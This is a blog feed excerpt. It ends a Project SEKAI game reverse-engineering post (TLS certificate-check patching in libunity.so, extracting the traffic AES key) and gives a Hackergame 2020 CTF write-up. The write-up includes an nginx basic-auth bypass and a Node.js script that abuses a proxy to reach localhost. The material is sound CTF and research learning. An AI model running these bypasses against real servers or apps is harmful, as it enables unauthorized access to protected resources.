+<p>动作文件则储存为了 Unity 的 <code>.anim</code> 格式，文件中绑定的参数名并非像 <code>.motion3.json</code> 格式中那样，以 string 形式直接储存，而是存为了 <code>crc32(参数类型 + '/' + 参数名)</code>。</p>
+
+
+
+<p>UnityLive2DExtractor 中通过读取动作文件对应的 GameObject(Transform) 来获取参数列表。通过计算各参数的 crc32 后反查，然后将 <code>.anim</code> 文件转换回 <code>.motion3.json</code>，但本游戏似乎并没有这样的 GameObject。</p>
+
+
+
+<p>分析几个文件后，发现只能在 <code>.moc3</code> 中找到模型 string 形式的参数列表。但 <code>.moc3</code> 并非开源格式，现在也没有公开的第三方解析器。因此目前暂时通过直接搜索 <code>.moc3</code> 中的 ASCII 字符来获取参数列表，用以转换 <code>.anim</code> 中 crc32 后的参数。</p>
+
+
+
+<p>通过修改 UnityLive2DExtractor，实现了 <code>.anim</code> 文件到 <code>.motion3.json</code> 文件的批量转换：<a href="https://github.com/Coxxs/SEKAI2DMotionExtractor" target="_blank" rel="noreferrer noopener">SEKAI2DMotionExtractor</a>。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-10.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-10-765x1024.png" alt="" class="wp-image-2159" width="381" height="511" srcset="https://dev.moe/wp-content/uploads/2020/11/image-10-765x1024.png 765w, https://dev.moe/wp-content/uploads/2020/11/image-10-224x300.png 224w, https://dev.moe/wp-content/uploads/2020/11/image-10-768x1028.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-10.png 845w" sizes="(max-width: 381px) 100vw, 381px" /></a><figcaption>(★ ω ★)</figcaption></figure></div>
+
+
+
+<h3>音频资源</h3>
+
+
+
+<p>游戏的音频文件都加密打包成了 <code>.acb</code> 格式，可以使用 CriTools 解包、解密。经过搜索引擎搜索，发现其密钥与『バンドリ！ ガールズバンドパーティ！』的一致。</p>
+
+
+
+<p>但至于本游戏的密钥是储存在哪里的，分析过后依然未能找到。</p>
+
+
+
+<h3>按需下载资源</h3>
+
+
+
+<p>本游戏包含大量的按需下载资源（~ 4GB），部分资源如果不执行到相应的场景，则不会进行下载。要获取所有的资源，除了把各分支都过一遍外，也可对游戏的网络通信进行分析。</p>
+
+
+
+<h2>网络通信分析</h2>
+
+
+
+<p>由于游戏仍在运营，这里仅作简单的分析记录，仅供学习研究之用。</p>
+
+
+
+<p>游戏使用 MessagePack 序列化数据，通过固定的 AES 密钥及 IV 进行 AES-128-CBC 加密，再通过 TLS（https）加密传输。</p>
+
+
+
+<p>TLS 的证书验证测试无法通过导入根证书等方式绕过。猜测验证发生在 libunity.so 的 curl 库中，通过二进制修改该文件可停用 curl 的证书验证。这里也找到了一个不错的支持 ARM64 的汇编代码<a href="https://disasm.pro/" target="_blank" rel="noreferrer noopener nofollow">转换网站</a>。</p>
+
+
+
+<p>AES 的 Key、IV 在 Sekai.APIManager 的构造函数中设置，具体的密钥则在游戏编译时导出到了 <code>global-metadata.dat</code>，参考 <a href="https://www.perfare.net/1408.html" target="_blank" rel="noreferrer noopener">Perfare 大神的文章</a>，在该文件中定位到找到密钥及IV。</p>
+
+
+
+<p>MessagePack 则可以直接转换为 JSON 格式，便于阅读。分析网络通信后，可以找到按需下载资源的列表等数据。</p>
+
+
+
+<h2>总结</h2>
+
+
+
+<p>我一向不喜欢手机网游，但无论从资源包数量上，还是从游戏本身，都能感觉到这个游戏还是挺有诚意的。</p>
+
+
+
+<p>这次的分析也算是简单尝试了下 ARM64 下的二进制 patch。当然，也同<a href="https://dev.moe/1282" target="_blank" rel="noreferrer noopener">上次</a>一样，基本上都是靠的前人研究与工具。如果塞几个未知算法进去，估计就够呛了。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2157">Project SEKAI 游戏分析</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2157/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2157</post-id>	</item>
+		<item>
+		<title>Hackergame 2020（中科大信安赛）write up</title>
+		<link>https://dev.moe/2099</link>
+					<comments>https://dev.moe/2099#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Sat, 07 Nov 2020 04:04:31 +0000</pubDate>
+				<category><![CDATA[Code]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2099</guid>
+
+					<description><![CDATA[<p>又是一年 Hackergame，题目依然高质量，依然对萌新友好，各种梗也依然玩得飞起。 一如既往，主办方也在 <a class="more-link" href="https://dev.moe/2099">继续阅读<span class="screen-reader-text">"Hackergame 2020（中科大信安赛）write up"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2099">Hackergame 2020（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>又是一年 Hackergame，题目依然高质量，依然对萌新友好，各种梗也依然玩得飞起。</p>
+
+
+
+<span id="more-2099"></span>
+
+
+
+<p>一如既往，主办方也在 GitHub 发布了 <a href="https://github.com/ustc-hackergame/hackergame2020-writeups" target="_blank" rel="noreferrer noopener">官方及选手 write up</a>。</p>
+
+
+
+<h2>超自动的开箱模拟器 200</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>想体验开箱的快乐吗？<br>这是一个开箱模拟器。当你输入「BF 开箱码」之后，程序会模拟 128 轮游戏，每轮你有 64 次开箱机会。<br>如果你 128 轮中每轮都能够在 64 次机会之内找到目标所在的箱子，那么你将会得到 flag。</p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/unboxing_simulator.zip">unboxing_simulator.py</a><a href="https://dev.moe/wp-content/uploads/2020/11/unboxing_simulator.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>只看题目不知所云，阅读源码后可以大概理清思路。128 个箱子内随机放着 1-128 的数字，如果打开箱子后，箱子内的数字与查找目标相同的话，本轮就开箱成功。而所谓的 BF 开箱码，其实就是 <strong>B</strong>rain<strong>F</strong>uck 代码。</p>
+
+
+
+<p>题目可以分成两个要解决的问题，一个是要找出一种策略，能够在 64 次机会内找到目标所在的箱子，并连续成功 128 轮；另一个是要用 BrainFuck 实现这种策略。</p>
+
+
+
+<p>这个开箱问题其实就是百囚徒问题（<a href="https://en.wikipedia.org/wiki/100_prisoners_problem" target="_blank" rel="noreferrer noopener">100 prisoners problem</a>）。策略如下：若查找的目标为 n，先打开 n 号箱，然后不断根据箱子内部的数字打开下一个箱子，直到找到本轮的目标箱。根据这样的策略， 就有约 30% 的几率能够保证 128 轮开箱全部成功。</p>
+
+
+
+<p>下一个问题就是要写出 BF 开箱码。BF 代码的名称就暗示了其编写难度，好在有人写了一个 C to BF 的编译器（<a href="https://github.com/arthaud/c2bf" target="_blank" rel="noreferrer noopener">arthaud/c2bf</a>），直接编写（伪）C 代码编译即可。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">int cur = 0;
+while (true) {
+	int next = read_char() - 1;
+	if (cur &lt; next) {
+		int c = next - cur;
+		// 优化一下，否则跑太慢会超时
+		while (c > 20) {
+			write_char(2);write_char(2);write_char(2);write_char(2);write_char(2);
+			write_char(2);write_char(2);write_char(2);write_char(2);write_char(2);
+			write_char(2);write_char(2);write_char(2);write_char(2);write_char(2);
+			write_char(2);write_char(2);write_char(2);write_char(2);write_char(2);
+			c = c - 20;
+		}
+		for (int i = 0; , i &lt; c, i = i + 1; ) {
+			write_char(2);
+		}
+	} else {
+		int c = cur - next;
+		while (c > 20) {
+			write_char(1);write_char(1);write_char(1);write_char(1);write_char(1);
+			write_char(1);write_char(1);write_char(1);write_char(1);write_char(1);
+			write_char(1);write_char(1);write_char(1);write_char(1);write_char(1);
+			write_char(1);write_char(1);write_char(1);write_char(1);write_char(1);
+			c = c - 20;
+		}
+		for (int i = 0; , i &lt; c, i = i + 1; ) {
+			write_char(1);
+		}
+	}
+	cur = next;
+	write_char(3);
+}
+</pre>
+
+
+
+<p>编译后的 BF 代码如下：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">>+[>+[>,>+[&lt;->-]&lt;&lt;&lt;&lt;[>>>>+>+&lt;&lt;&lt;&lt;&lt;-]>>>>>[&lt;&lt;&lt;&lt;&lt;+>>>>>-]&lt;+&lt;[>>+>+&lt;&lt;&lt;-]>>>[&lt;&lt;&lt;+>>>-]>+&lt;&lt;&lt;[>>+&lt;&lt;-]>>[>-]>[>&lt;&lt;&lt;&lt;+>[-]>>->]&lt;+&lt;&lt;[>-[>-]>[>&lt;&lt;&lt;&lt;+>[-]+>>->]&lt;+&lt;&lt;-]>[-]>-&lt;&lt;+&lt;[&lt;[>>>+>+&lt;&lt;&lt;&lt;-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;[>>>>>>>+>+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]>>>>>>>>[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+>>>>>>>>-]&lt;[&lt;->-]+[&lt;[>>+>+&lt;&lt;&lt;-]>>>[&lt;&lt;&lt;+>>>-]>++[&lt;++++++++++>-]&lt;>>+&lt;&lt;&lt;[>>+&lt;&lt;-]>>[>-]>[>&lt;&lt;&lt;&lt;+>[-]>>->]&lt;+&lt;&lt;[>-[>-]>[>&lt;&lt;&lt;&lt;+>[-]+>>->]&lt;+&lt;&lt;-]>[-]>-&lt;&lt;&lt;[>+&lt;[-]]+>[&lt;->-]&lt;[>++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]++.[-]&lt;&lt;&lt;[>>>+>+&lt;&lt;&lt;&lt;-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]>++[&lt;++++++++++>-]&lt;[&lt;->-]&lt;&lt;&lt;&lt;[-]>>>[&lt;&lt;&lt;+>>>-]&lt;[-]&lt;+>]&lt;-]>+[&lt;[>>+>+&lt;&lt;&lt;-]>>>[&lt;&lt;&lt;+>>>-]&lt;+&lt;&lt;&lt;[>>>>+>+&lt;&lt;&lt;&lt;&lt;-]>>>>>[&lt;&lt;&lt;&lt;&lt;+>>>>>-]>+&lt;&lt;&lt;[>>+&lt;&lt;-]>>[>-]>[>&lt;&lt;&lt;&lt;+>[-]>>->]&lt;+&lt;&lt;[>-[>-]>[>&lt;&lt;&lt;&lt;+>[-]+>>->]&lt;+&lt;&lt;-]>[-]>-&lt;&lt;&lt;[>++.[-]&lt;&lt;&lt;[>>>+>+&lt;&lt;&lt;&lt;-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]+[&lt;+>-]&lt;&lt;&lt;&lt;[-]>>>[&lt;&lt;&lt;+>>>-]&lt;[-]&lt;+>]&lt;-]&lt;[-]&lt;[-]&lt;-&lt;[-]]&gt;[&lt;&lt;&lt;&lt;&lt;[>>>>>>+>+&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]>>>>>>>[&lt;&lt;&lt;&lt;&lt;&lt;&lt;+>>>>>>>-]&lt;&lt;&lt;&lt;[>>>>+>+&lt;&lt;&lt;&lt;&lt;-]>>>>>[&lt;&lt;&lt;&lt;&lt;+>>>>>-]&lt;[&lt;->-]+[&lt;[>>+>+&lt;&lt;&lt;-]>>>[&lt;&lt;&lt;+>>>-]>++[&lt;++++++++++>-]&lt;>>+&lt;&lt;&lt;[>>+&lt;&lt;-]>>[>-]>[>&lt;&lt;&lt;&lt;+>[-]>>->]&lt;+&lt;&lt;[>-[>-]>[>&lt;&lt;&lt;&lt;+>[-]+>>->]&lt;+&lt;&lt;-]>[-]>-&lt;&lt;&lt;[>+&lt;[-]]+>[&lt;->-]&lt;[>+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]+.[-]&lt;&lt;&lt;[>>>+>+&lt;&lt;&lt;&lt;-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]>++[&lt;++++++++++>-]&lt;[&lt;->-]&lt;&lt;&lt;&lt;[-]>>>[&lt;&lt;&lt;+>>>-]&lt;[-]&lt;+>]&lt;-]>+[&lt;[>>+>+&lt;&lt;&lt;-]>>>[&lt;&lt;&lt;+>>>-]&lt;+&lt;&lt;&lt;[>>>>+>+&lt;&lt;&lt;&lt;&lt;-]>>>>>[&lt;&lt;&lt;&lt;&lt;+>>>>>-]>+&lt;&lt;&lt;[>>+&lt;&lt;-]>>[>-]>[>&lt;&lt;&lt;&lt;+>[-]>>->]&lt;+&lt;&lt;[>-[>-]>[>&lt;&lt;&lt;&lt;+>[-]+>>->]&lt;+&lt;&lt;-]>[-]>-&lt;&lt;&lt;[>+.[-]&lt;&lt;&lt;[>>>+>+&lt;&lt;&lt;&lt;-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]+[&lt;+>-]&lt;&lt;&lt;&lt;[-]>>>[&lt;&lt;&lt;+>>>-]&lt;[-]&lt;+>]&lt;-]&lt;[-]&lt;[-]&lt;-]&lt;&lt;[>+>+&lt;&lt;-]>>[&lt;&lt;+>>-]&lt;&lt;&lt;&lt;&lt;[-]>>>>[&lt;&lt;&lt;&lt;+>>>>-]+++.[-]&lt;[-]&lt;[-]&lt;+>]&lt;-]</pre>
+
+
+
+<p>由于该开箱策略能否成功基于箱子的初始状态，成功率并非 100%，多次提交获得 flag。</p>
+
+
+
+<h2>超精巧的数字论证器 200</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>数字论证是一种常见的定理证明方法。简单来说，就是对于给定的自然数，找出一个等值的表达式，如果该表达式去除所有符号部分后为字符串「114514」，则完成论证。表达式仅允许整数运算，可以使用括号、常见的代数运算符 +-*/% 和位运算符 ~^&amp;|。表达式具体运算规则与 Python 2 语言类似。<br>一些数字论证的例子：<br>0 = (1/14514)<br>1 = (1%14514)<br>2 = (11&amp;4514)<br>3 = (1+(14&amp;514))<br>数字论证并不是一件容易的事情，你可以完成这个任务吗？<br>给定的自然数保证小于 114514。输入的表达式长度不可以超过 256 字符。</p></blockquote>
+
+
+
+<p>数字论证已经是一门成熟的技术了（确信），网上有许多现成的数字论证生成代码。找来修改了下运算符并运行，但发现能论证的数字基本都集中在几千以内，比较大的数字几乎都无法论证出。</p>
+
+
+
+<p>但题目中有一句意义不明的话——输入的表达式长度不可以超过 256 字符。如果只是简单添加几个符号，表达式顶多几十个字符，根本不需要 256 字符那么长。只有一种符号可以大量添加，那就是一元运算符。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">~114 = -115
+~-114 = 113
+-~114 = 115
+~-~114 = -116
+-~-114 = -113
+~-~-114 = 112
+-~-~114 = 116</pre>
+
+
+
+<p>通过大量使用 <code>-</code>（取负）、<code>~</code>（取反）这两个一元运算符，可以直接将数字转换为相邻的数字，大大增加了可以论证的数字范围。</p>
+
+
+
+<p>基于这份<a href="https://www.zhihu.com/question/264059954/answer/1048076997" target="_blank" rel="noreferrer noopener">前人的数字论证研究</a>（在此表示感谢），修改出新的论证代码：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from functools import reduce
+import itertools
+
+invrange = 4
+
+class Expression():
+    maxValue = 1000000
+    operators = ['*', '/', '%', '+', '-', '^', '&amp;', '|']
+    priority = {
+        '*': 3,
+        '/': 3,
+        '%': 3,
+        '+': 4,
+        '-': 4,
+        '&amp;': 5,
+        '^': 6,
+        '|': 6,
+    }
+    operation = {
+        '*': lambda a, b: a * b,
+        '/': lambda a, b: a // b,
+        '%': lambda a, b: a % b,
+        '-': lambda a, b: a - b,
+        '+': lambda a, b: a + b,
+        '^': lambda a, b: a ^ b,
+        '&amp;': lambda a, b: a &amp; b,
+        '|': lambda a, b: a | b,
+    }
+
+    def __init__(self, value=0, exp='', priority=0):
+        self.value = value
+        self.exp = exp
+        self.priority = priority
+
+
+class Node():
+    def __init__(self):
+        self.expressions = {}
+
+    def add_child(self, lnode, rnode):
+        for lval, lexp in lnode.expressions.items():
+            for rval, rexp in rnode.expressions.items():
+                for opt in Expression.operators:
+                    lstr = lexp.exp
+                    rstr = rexp.exp
+                    if rexp.value &lt; 0 and opt == '**':
+                        continue
+                    if rexp.value == 0 and (opt == '/' or opt == '%'):
+                        continue
+                    optResult = Expression.operation[opt](
+                        lval, rval)
+                    if optResult > Expression.maxValue:
+                        continue
+
+                    if lexp.priority >= Expression.priority[opt]:
+                        lstr = '(' + lstr + ')'
+                    if rexp.priority >= Expression.priority[opt]:
+                        rstr = '(' + rstr + ')'
+
+                    self.expressions[optResult] = Expression(optResult, lstr + opt +
+                                                             rstr, Expression.priority[opt])
+
+                    s = '-(' + lstr + opt + rstr + ')'
+                    val = -optResult
+                    self.expressions[val] = Expression(val, s, 1)
+                    
+                    s = '~(' + lstr + opt + rstr + ')'
+                    val = ~optResult
+                    self.expressions[val] = Expression(val, s, 1)
+
+                    for i in range(1, invrange + 1):
+                        s = '-~' * i + '(' + lstr + opt + rstr + ')'
+                        val = optResult
+                        for j in range(i):
+                            val = -~val
+                        self.expressions[val] = Expression(val, s, 1)
+                        self.expressions[~val] = Expression(~val, '~' + s, 1)
+
+                    for i in range(1, invrange + 1):
+                        s = '~-' * i + '(' + lstr + opt + rstr + ')'
+                        val = optResult
+                        for j in range(i):
+                            val = ~-val
+                        self.expressions[val] = Expression(val, s, 1)
+                        self.expressions[-val] = Expression(-val, '-' + s, 1)
+
+
+
+    def add_expression(self, expression):
+        self.expressions[expression.value] = expression
+
+def splitNumStr(digits):
+    if len(digits) == 1:
+        return [[digits]]
+    result = []
+    for i in range(1, len(digits)):
+        left = digits[:i]
+        right = digits[i:]
+        rightList = splitNumStr(right)
+        for c in rightList:
+            cc = c
+            cc.insert(0, left)
+            result.append(cc)
+    result.append([digits])
+    return result
+
+class SuujiRonshou():
+    def __init__(self, digits="114514"):
+        self.expressions = {}
+        self.digitlist = splitNumStr(digits)
+        print(self.digitlist)
+        for digits in self.digitlist:
+            if digits == ['1', '1', '4', '514']:
+                invrange = 6
+            elif len(digits) &lt;= 4:
+                invrange = 5
+            elif len(digits) &lt;= 5:
+                invrange = 3
+            else:
+                invrange = 1
+            print(digits)
+            self.digits = digits
+            self.generate()
+
+    def generate(self):
+        visitedNode = dict()
+
+        def dfs(l, r):
+            if (l, r) in visitedNode:
+                return visitedNode[(l, r)]
+            elif l > r:
+                return None
+            elif (l == r):
+                d = self.digits[l]
+                root = Node()
+                root.add_expression(Expression(int(d), d, 0))
+                # if l == 0:  # 第一个数可以为负数
+                root.add_expression(Expression(-int(d), '-' + d, 0))
+                root.add_expression(Expression(~int(d), '~' + d, 0))
+
+                for i in range(1, invrange + 1):
+                    s = '-~' * i
+                    val = int(d)
+                    for j in range(i):
+                        val = -~val
+                    root.add_expression(Expression(val, s + d, 0))
+                    root.add_expression(Expression(~val, '~' + s + d, 0))
+
+                for i in range(1, invrange + 1):
+                    s = '~-' * i
+                    val = int(d)
+                    for j in range(i):
+                        val = ~-val
+                    root.add_expression(Expression(val, s + d, 0))
+                    root.add_expression(Expression(-val, '-' + s + d, 0))
+
+                visitedNode[(l, r)] = root
+                return root
+            else:
+                root = Node()
+                for mid in range(l, r):
+
+                    lnode = dfs(l, mid)
+                    rnode = dfs(mid + 1, r)
+                    root.add_child(lnode, rnode)
+
+                visitedNode[(l, r)] = root
+                return root
+
+        node = dfs(0, len(self.digits) - 1)
+        # print(node.expressions)
+        self.expressions = { **self.expressions, **node.expressions }
+
+    def print_all(self, l, r):
+        for i in range(l, r):
+            print(i, self.find(i))
+
+    def find(self, target):
+        if target not in self.expressions:
+            return "None"
+        else:
+            return self.expressions[target].exp
+
+
+if __name__ == "__main__":
+    solver = SuujiRonshou()
+    solver.print_all(1, 114514 + 1)
+</pre>
+
+
+
+<p>运行等待生成出 1~114514 的数字论证表即可。</p>
+
+
+
+<h2>超简易的网盘服务器 200</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>小 C 同学正因为手边的这块购买了方才三个月的 64GB 银土顿炫酷至尊飞速闪存盘的损坏而苦恼着。<br>其实自从听说，隔壁寝室发生了因为室友破解加密硬盘而发生了一系列不可描述的事情，小 C 同学就一直在盘算着一个新的主意！<br>“上云！都 2020 年了，再不上云就要被时代抛弃了！”，小 C 在心中终于做出了这样的决定，“把钱交给「银土顿」，还不如交给「奇葩云」呢，好歹还有 50% 的SLA 保证”。小 C 是一个雷厉风行的同学，他飞速的打开了「奇葩云」的网站，验证学生身份，并购买了一台学生服务器。<br>登录了服务器后台的小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护根目录下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 /Public 目录来共享文件！”<br>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的根目录。</p><cite><a href="http://202.38.93.111:10120/" target="_blank" rel="noreferrer noopener nofollow">题目地址</a> <a href="https://gist.github.com/Coxxs/558126e9f402aa46b827b53db362813e" target="_blank" rel="noreferrer noopener nofollow">配置文件</a></cite></blockquote>
+
+
+
+<p>先研究了一会 h5ai，发现 h5ai 有打包下载文件的功能。不过这个功能判断相当严格，会拒绝一切对父目录文件的下载请求。其实这也很合理，毕竟 h5ai 是比较成熟的程序了，应该不会有很严重的安全问题。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-7.1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-7.1.png" alt="" class="wp-image-2120" width="428" height="211" srcset="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-7.1.png 787w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-7.1-300x148.png 300w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-7.1-768x380.png 768w" sizes="(max-width: 428px) 100vw, 428px" /></a><figcaption>贴心的打包下载功能</figcaption></figure>
+
+
+
+<p>题目还提供了 <code>Dockerfile</code> 及 <code>nginx.conf</code>。<code>Dockerfile</code> 里安装的软件版本似乎都比较新，也没有有用的 CVE。<code>nginx.conf</code> 中倒是看出了一些端倪：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">server{
+    root /var/www/html;
+    index index.php index.html /_h5ai/public/index.php;
+
+    location / {
+        auth_basic "easy h5ai. For visitors, please refer to public directory at `/Public!`";
+        auth_basic_user_file /etc/nginx/conf.d/htpasswd;
+    }
+
+    # 错误匹配了一切以 Public 开头的路径，如 Publicaaa
+    location /Public {
+        allow all;
+        # 上面还有一个 index，难道有两份 h5ai？
+        index /Public/_h5ai/public/index.php;
+    }
+
+    location ~ \.php$ {
+             ...
+    }
+    ...
+}
+</pre>
+
+
+
+<p>一开始想着怎么利用 /Publicaaa 之类的路径调用到根目录下的 h5ai，并没有什么成果。后来试着试着发现在拒掉 HTTP 基础认证后（浏览器按取消），竟然可以直接访问到根目录下的 <code>/_h5ai/public/index.php</code>。结合此前提到的打包下载功能，直接向该文件发送打包下载请求即可获取 flag。</p>
+
+
+
+<p>nginx 的配置优先级很迷倒是早已有亲身体验，不过到最后还是没能理解这里到底发生了什么。莫非 basic_auth 被拒后又进了 <code>location ~ .php$</code> 块？</p>
+
+
+
+<p>赛后看到其他选手的分析，其实是 nginx 优先匹配了 <code>location ~ </code> ，也就是将该页面直接交给 php 进行解析，并不会进行基础认证。至于为什么浏览器会弹出基础认证窗口，是因为页面内调用的资源（如 <code>css</code> ）触发了基础认证。</p>
+
+
+
+<p>下次写 nginx 配置文件的时候一定要好好学习下文档（咕咕预警）。</p>
+
+
+
+<h2>超安全的代理服务器 350</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p><p>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</p><cite>题目地址：https://146.56.228.227/</cite></blockquote>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-1-1024x440.png" alt="" class="wp-image-2121" width="632" height="271" srcset="https://dev.moe/wp-content/uploads/2020/11/image-1-1024x440.png 1024w, https://dev.moe/wp-content/uploads/2020/11/image-1-300x129.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-1-768x330.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-1.png 1474w" sizes="(max-width: 632px) 100vw, 632px" /></a><figcaption>sshoshoushou&#8217;yshou&#8217;ye首页</figcaption></figure>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-2-1024x660.png" alt="" class="wp-image-2122" width="525" height="338" srcset="https://dev.moe/wp-content/uploads/2020/11/image-2-1024x660.png 1024w, https://dev.moe/wp-content/uploads/2020/11/image-2-300x193.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-2-768x495.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-2.png 1193w" sizes="(max-width: 525px) 100vw, 525px" /></a><figcaption>帮助中心</figcaption></figure>
+
+
+
+<p>这道题用到了一个相对比较新的技术，HTTP/2 Server Push。在 HTTP/2 协议中，服务器可以把一些资源提前主动推送给客户端，提高客户端的使用体验。</p>
+
+
+
+<p>Cloudflare 在<a href="https://blog.cloudflare.com/tools-for-debugging-testing-and-using-http-2/" target="_blank" rel="noreferrer noopener nofollow">一篇博客</a>中推荐了几个 HTTP/2 的测试工具，我选用了 h2c 来接收 HTTP/2 Push，并用 curl 发送请求，一切看起来都如此可靠。</p>
+
+
+
+<p>然后，我就浪费了两个小时。</p>
+
+
+
+<p>h2c 不会输出 Server Push 请求体（Body），导致我以为 Server Push 的 location 字段是 Secret；curl 在开启了 verbose 后依然不会输出 proxy connect 的请求体，导致我一直没有发现 Secret 是错误的。</p>
+
+
+
+<p>一怒之下，抄起支持 http2 模块的 node.js，自给自足：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
+
+const http2 = require('http2')
+
+let clientSession = http2.connect('https://146.56.228.227/');
+let req = clientSession.request({ [http2.constants.HTTP2_HEADER_PATH]: '/' });
+clientSession.on('stream', (pushedStream, requestHeaders) => {
+  pushedStream.on('push', (responseHeaders) => { });
+  pushedStream.on('data', (chunk) => { 
+    console.log(chunk.toString())
+    let matches = chunk.toString().match(/secret: ([a-z0-9]+)/)
+    if (!matches) {
+      throw new Error('no secret')
+    }
+    connectProxy(matches[1]);
+   });
+});
+
+const tls = require('tls')
+
+function connectProxy(secret) {
+  var clientSocket = tls.connect(443, '146.56.228.227', { rejectUnauthorized: false });
+  clientSocket.on('connect', function() {
+    clientSocket.write(
+      'CONNECT ustc.edu.cn.vcap.me:8080 HTTP/1.1\r\n' + // 绕过域名验证
+      'Secret: ' + secret + '\r\n\r\n');
+    clientSocket.write(
+      'GET / HTTP/1.1\r\n' + 
+      'Host: 127.0.0.1:8080\r\n' +
+      'Referer: 146.56.228.227\r\n\r\n');    
+  })
+  clientSocket.on('data', (data) => {
+    console.log(data.toString().trim());
+  });
+}</pre>
+
+
+
+<p>HTTP/2 Server Push 的请求体包含了 Secret 和第一个 flag。VMWare 的 *.vcap.me 域名泛解析至 127.0.0.1，用其绕过域名验证，获取管理中心内的第二个 flag。</p>
+
+
+
+<h2>证验码 250</h2>
+
+
+
